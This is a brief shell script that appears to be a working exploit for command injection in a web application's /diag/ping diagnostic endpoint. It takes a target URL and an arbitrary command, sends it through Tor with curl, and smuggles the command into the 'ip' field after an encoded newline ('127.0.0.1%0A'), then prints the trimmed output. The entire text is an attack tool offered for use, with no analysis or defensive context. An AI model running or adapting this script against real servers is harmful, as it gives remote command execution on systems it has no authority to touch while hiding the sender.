if [ $# -lt 2 ]; 
   then 
   printf "Usage $0 url 'cmd'\n" $# 
   exit 0 
   fi 



torify curl -s -d "ip=127.0.0.1%0A$2" -X POST $1/diag/ping | tail -n +20 | head -n -1
